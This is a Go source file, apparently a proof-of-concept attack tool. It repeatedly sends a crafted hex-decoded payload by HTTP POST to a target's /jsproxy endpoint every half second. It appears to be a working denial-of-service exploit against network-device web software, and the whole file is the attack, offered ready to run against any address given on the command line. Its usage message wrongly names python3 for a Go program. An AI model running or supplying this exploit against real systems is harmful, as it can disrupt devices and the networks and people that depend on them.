package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

func Start(address string, port_optional ...int) {
	port := 80
	if len(port_optional) > 0 {
		port = port_optional[0]
	}
	var payload = "00000000000000005e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e"
	resDec, err := hex.DecodeString(payload)
	if err != nil {
		os.Exit(1)
	}
	var resStr = string(resDec)

	posturl := fmt.Sprintf("http://%s:%d/jsproxy", address, port)

	body := bytes.NewBufferString(resStr)

	r, err := http.NewRequest("POST", posturl, body)
	if err != nil {
		fmt.Println(err)
	}
	r.Header.Add("Content-Type", "msg")

	client := &http.Client{}
	_, _ = client.Do(r)
}

func IsDigit(s string) bool {
	_, err := strconv.Atoi(s)
	if err == nil {
		return true
	} else {
		return false
	}
}

func main() {
	if len(os.Args) < 2 || (len(os.Args) == 3 && !IsDigit(os.Args[2]) || len(os.Args) > 3) {
		fmt.Printf("Usage: python3 %s IP_ADDRESS/HOSTNAME [PORT]\n", os.Args[0])
		os.Exit(1)
	}

	fmt.Println("Press Ctrl+C to terminate the program")
	for {
		if len(os.Args) == 3 {
			port, _ := strconv.Atoi(os.Args[2])
			Start(os.Args[1], port)
		} else {
			Start(os.Args[1])
		}
		time.Sleep(500 * time.Millisecond)
	}
}
